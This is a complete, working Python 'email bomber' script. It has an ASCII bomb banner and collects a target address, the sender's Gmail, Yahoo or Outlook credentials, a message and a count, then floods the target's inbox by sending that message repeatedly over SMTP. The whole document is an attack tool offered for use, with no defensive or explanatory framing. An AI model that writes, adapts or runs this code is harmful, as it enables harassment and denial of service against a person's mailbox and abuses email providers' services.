import smtplib
import getpass
import time

class Color:
    GREEN = '\33[1;49;92m'
    RED = '\33[1;49;31m'
    YELLOW = '\33[1;49;33m'

def banner():
    print(Color.RED + ' [+[+[+ starting bomb +]+]+]')
    print(Color.RED + '''                                             
                                              
                                ██    ██      
                    ██████      ██  ██        
                  ██      ██                   
                ██          ████░░    ████    
                ██                             
              ██████            ██  ██        
              ██████            ██    ██      
          ██████████████                       
        ██████░░░░░░░░▓▓██                    
      ██████░░░░░░░░  ▓▓▓▓██                   
      ██████▓▓▓▓▓▓▓▓    ▓▓██                   
    ████████▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓██                
    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                
    ████████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓██                
      ████████▓▓▓▓▓▓▓▓▓▓▓▓██                   
      ████████████▓▓▓▓▓▓████                   
        ██████████████████                    
          ██████████████                       
              ██████                           
                                              
                                              
''')
    print(Color.RED + 'BOMB OF DOOM')

class EmailBomber:
    def __init__(self):
        # Initialization setup
        print(Color.RED + '+[+[+[ Initializing email bomber... ]+]+]+')
        self.target = input(Color.GREEN + 'Enter target email address: ')
        self.from_addr = input(Color.GREEN + 'Enter your email address: ')
        self.pwd = getpass.getpass(Color.GREEN + 'Enter your password: ')
        self.subject = input(Color.GREEN + 'Enter email subject: ')
        self.message = input(Color.GREEN + 'Enter email message: ')
        self.amount = int(input(Color.GREEN + 'Enter number of emails (e.g., 1-5): '))
        self.delay = float(input(Color.GREEN + 'Enter delay between emails (seconds): '))
        self.port = 587  # Default SMTP port
        self.server = None
        self.s = None

    def configure_server(self):
        print(Color.GREEN + '+[+[+[ Configuring email server... ]+]+]+')
        provider = input(Color.GREEN + 'Choose email provider (1) Gmail (2) Yahoo (3) Outlook: ')
        
        if provider == "1":
            self.server = 'smtp.gmail.com'
        elif provider == '2':
            self.server = 'smtp.mail.yahoo.com'
        elif provider == '3':
            self.server = 'smtp-mail.outlook.com'
        else:
            print(Color.RED + 'Invalid provider choice. Exiting...')
            exit()

        try:
            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.from_addr, self.pwd)
            print(Color.GREEN + 'Successfully logged in.')
        except smtplib.SMTPAuthenticationError:
            print(Color.RED + 'Authentication failed. Check credentials and app-specific settings.')
            exit()

    def send_email(self):
        self.msg = f"From: {self.from_addr}\nTo: {self.target}\nSubject: {self.subject}\n\n{self.message}"
        try:
            self.s.sendmail(self.from_addr, self.target, self.msg)
            print(Color.GREEN + f'Email sent to {self.target}')
        except smtplib.SMTPException as e:
            print(Color.RED + 'Error sending email:', str(e))

    def start_sending(self):
        print(Color.GREEN + '+[+[+[ Starting email notifications... ]+]+]+')
        for _ in range(self.amount):
            self.send_email()
            time.sleep(self.delay)
        self.s.close()
        print(Color.GREEN + 'All emails sent.')

    def __del__(self):
        if self.s:
            self.s.close()

if __name__ == '__main__':
    banner()
    bomber = EmailBomber()
    bomber.configure_server()
    bomber.start_sending()